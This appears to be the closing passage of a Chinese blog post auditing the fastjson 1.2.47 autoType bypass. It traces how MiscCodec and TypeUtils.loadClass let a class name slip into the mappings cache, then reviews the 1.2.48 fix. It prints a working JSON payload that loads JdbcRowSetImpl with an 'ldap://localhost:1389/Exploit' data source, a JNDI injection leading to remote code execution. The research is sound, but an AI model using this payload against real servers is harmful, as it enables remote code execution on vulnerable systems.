@@ -1,0 +1,186 @@
+            }
+            //3. 这里也有，限制很松
+            try{
+                //加载类
+                clazz = Class.forName(className);
+                //直接放入mappings中
+                mappings.put(className, clazz);
+                return clazz;
+            } catch(Throwable e){
+                // skip
+            }
+            return clazz;
+        }
+可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）
+看看这个类在什么地方被引用。
+前三者都是在`ParserConfig#autocheck`这个我们需要攻克的类中，如果能在那里调用loadClass并传入一个恶意类去加载。那就已经完成了我们的最终目的，根本不需要通过mappings这个空子去钻。
+所以只需要看TypeUtils.java中的引用处。
+    public static Class loadClass(String className, ClassLoader classLoader) {
+            return loadClass(className, classLoader, true);
+        }
+**cache为true** ，一个好消息，因为有三处修改mapping的地方，两个地方需要cache为true。
+这百年可以看到在这个类中会自己引用自己的类，跳来跳去，但是也有外部的类引用当前类。这是我们主要关注的。（因为一个底层的工具类，不可能被我们直接调用到）
+慢慢看，把跳出去的接口理出来
+    /com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):334
+这两个静态的，没搞头，就不看了。
+只有上面一个跳出去`MiscCodec.java#deserialze`的，我们再过去看看：
+> 以下代码段请一大段一大段倒着回退回来看
+    public  T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) {
+            JSONLexer lexer = parser.lexer;
+            //4. clazz类型等于InetSocketAddress.class的处理。
+            //我们需要的clazz必须为Class.class，不进入
+            if (clazz == InetSocketAddress.class) {
+                ...
+            }
+            Object objVal;
+            //3. 下面这段赋值objVal这个值
+            //此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思
+            if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) {
+                //当parser.resolveStatus的值为  TypeNameRedirect
+                parser.resolveStatus = DefaultJSONParser.NONE;
+                parser.accept(JSONToken.COMMA);
+                //lexer为json串的下一处解析点的相关数据
+                 //如果下一处的类型为string
+                if (lexer.token() == JSONToken.LITERAL_STRING) {
+                    //判断解析的下一处的值是否为val，如果不是val，报错退出
+                    if (!"val".equals(lexer.stringVal())) {
+                        throw new JSONException("syntax error");
+                    }
+                    //移动lexer到下一个解析点
+                    //举例："val":(移动到此处->)"xxx"
+                    lexer.nextToken();
+                } else {
+                    throw new JSONException("syntax error");
+                }
+                parser.accept(JSONToken.COLON);
+                //此处获取下一个解析点的值"xxx"赋值到objVal
+                objVal = parser.parse();
+                parser.accept(JSONToken.RBRACE);
+            } else {
+                //当parser.resolveStatus的值不为TypeNameRedirect
+                //直接解析下一个解析点到objVal
+                objVal = parser.parse();
+            }
+            String strVal;
+            //2. 可以看到strVal是由objVal赋值，继续往上看
+            if (objVal == null) {
+                strVal = null;
+            } else if (objVal instanceof String) {
+                strVal = (String) objVal;
+            } else {
+                //不必进入的分支
+            }
+            if (strVal == null || strVal.length() == 0) {
+                return null;
+            }
+            //省略诸多对于clazz类型判定的不同分支。
+            //1. 可以得知，我们的clazz必须为Class.class类型
+            if (clazz == Class.class) {
+                //我们由这里进来的loadCLass
+                //strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名。往上看看能不能得到一个恶意类名。
+                return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
+            }
+那么经过分析，我们可以得到的关注点又跑到`parser.resolveStatus`这上面来了
+  1. 当`parser.resolveStatus == TypeNameRedirect` 我们需要json串中有一个 **"val":"恶意类名"** ，来进入if语句的true中，污染objVal，再进一步污染strVal。我们又需要 **clazz为class类** 来满足if判断条件进入loadClass。
+所以一个json串的格式大概为`"被屏蔽的type"="java.lang.Class","val":"恶意类名"` 这样一个东西，大概如此。
+  2. 当`parser.resolveStatus ！= TypeNameRedirect`进入if判断的false中，可以直接污染objVal。再加上 **clazz=class类**
+大概需要一个json串如下:`"被屏蔽的type"="java.lang.Class","恶意类名"`。
+至于哪里调用了`MiscCodec.java#deserialze`，查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如解析过程中的`com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map,
+java.lang.Object)-384行`
+#### 定向砸payload
+那么在得到如上信息中，我们就不必一直大海摸虾。之前拿到了两个分支paylaod，拿一个可能的paylaod，试试水看看能不能往TypeUtils.getClassFromMapping(typeName）里面的mapping污染我们的恶意类。
+    {
+        "被屏蔽的type": "java.lang.Class", 
+        "val": "com.sun.rowset.JdbcRowSetImpl"
+    }
+先是日常进入解析主要函数`com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map,
+java.lang.Object)`
+这里有我们的三个在乎的点，如下顺序：
+    public final Object parseObject(final Map object, Object fieldName) {
+       ...  
+       //先是checkAutoType这个万恶的过滤函数
+       clazz = config.checkAutoType(typeName, null, lexer.getFeatures());
+       ...
+       //ResolveStatus的赋值
+       this.setResolveStatus(TypeNameRedirect);
+       //污染TypeUtils.getClassFromMapping的触发处
+       Object obj = deserializer.deserialze(this, clazz, fieldName);
+    }
+`com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String,
+java.lang.Class, int)`这个分析过了。
+从`deserializers.findClass(typeName)`出去，这是我们之前分析过的一处可以绕过白名单黑名单出去的地方，但是这里只存放一些默认类，不可污染。而我们的class.class就在这个默认类列表中，自然直接出去了。（比如class.class怎么也不会匹配到黑名单，不这里出去，也是可以下面出去的）
+再是，给ResolveStatus赋值了TypeNameRedirect，这样到deserialze里面就可以确定了分支，与预计吻合。这个payload砸的没错。
+可以发现进入了我们预计希望进入的`com.alibaba.fastjson.serializer.MiscCodec#deserialze`，可以看到上面有复杂的if判断，这就是得到初步的思路之后砸payload的好处，如果满足条件，我们就不用费力气去想这些是为啥的，反正默认进来了，不满足我们再去看哪里不符合就行。
+一切按照计划进行。
+由于objVal是一个String，继续赋值给strVal
+跳跳跳，我们之前由checkAutoType得到的clazz为Class.class，进入loadCLass
+默认cache为true，之前分析的时候也说到cache为true对我们来说是个好消息。接下来会有三种情况可以污染我们的关键mapping。看看会进入哪一个
+下一个
+第二个if中，帮我们加载了一个classloader，再因为上一层的cache默认为true，就真的执行成功了`mappings.put`放入了我们的恶意类名！
+完美穿针引线，一环扣一环，往mappings中加入了我们的恶意类。这就是大黑阔嘛，爱了爱了。
+> 现在回头来看这个mapping看到现在，就是放入一些已经加载过了的类，在checkAutoType中就不进行检查来提高速度。
+来一个调用栈：
+那么获取一个有恶意类的类似缓存机制的mapping有啥用呢。再进一步被屏蔽的type就好。
+之前看到其他博客说，一开始payload是分成两截，因为服务器的mappings自从加过恶意类之后，就会一直保持，然后就可以随便打了。
+但是之后为了不让负载均衡，平摊payload造成有几率失败，就变成了以下一个。
+    {
+        "a": {
+            "被屏蔽的type": "java.lang.Class", 
+            "val": "com.sun.rowset.JdbcRowSetImpl"
+        }, 
+        "b": {
+            "被屏蔽的type": "com.sun.rowset.JdbcRowSetImpl", 
+            "dataSourceName": "ldap://localhost:1389/Exploit", 
+            "autoCommit": true
+        }
+    }
+审计结束完美。
+> 回顾一下进来的过程：
+>
+> 我们进入com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map,
+> java.lang.Object)
+>
+>   1. checkAutoType方法拿到Class.class
+>   2. 设置了ResolveStatus为TypeNameRedirect，决定了之后deserialze中的if走向
+>   3. 进入deserializer.deserialze
+>
+>
+> com.alibaba.fastjson.serializer.MiscCodec#deserialze
+>
+>   1. parser.resolveStatus为TypeNameRedirect，进入if为true走向
+>   2. 解析"val":"恶意类名"，放入objVal，再传递到strVal
+>   3. 因为clazz=Class.class，进入TypeUtils.loadClass，传入strVal
+>
+>
+> com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String,
+> java.lang.ClassLoader)
+>
+>   1. 添加默认cache为true，调用loadClass
+>
+>
+> com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String,
+> java.lang.ClassLoader, boolean)
+>
+>   1. 三个改变mappings的第一处，由于classLoader=null，不进入
+>   2.
+> 三个改变mappings的第二处，classLoader=null，进入；获取线程classLoader，由于cache为true，添加mappings。
+>
+### 1.2.48修复
+对比代码。修改了cache这一处。（右侧为1.2.47代码）
+本来应该进入一个loadClass（两个参数）的方法，然后默认cache为true，在进入三个参数的loadClass。
+现在这边直接指定过来三个参数loadClass同时cache为false。
+可见，在同样payload执行时，我们原来说会改变mappings的第二处就因为cache而无法改变。
+但是我们还记得之前分析时有第三处不需要校验cache的mappings赋值！精神一振，这就是0day的气息么！
+然后.......
+这就是程序员的力量么，两行代码秒杀一切，爱了爱了，0day再见。
+### 1.2.48以后
+在这个通杀payload之后，就又恢复了一片平静的，在服务端手动配置关闭白名单情况下的黑名单与绕过黑名单的战争。这个战争估计随着代码不断迭代，也是不会停止的。
+之后又出了一个影响广泛的拒绝服务漏洞，在1.2.60版本被修复。
+当然这与反序列化就无关了，同时这篇文章也写得太久，太长了。也算是给2019做个结尾吧。
+所以，
+2020年，新年快乐。
+要不 下场雪吧？
+## 参考
+[l1nk3r大佬](http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/)
+[https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/](https://www.kingkk.com/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/)
+可能还看了很多。。但是真的回头找不到了，向网上老哥们致敬 (^^ゞ
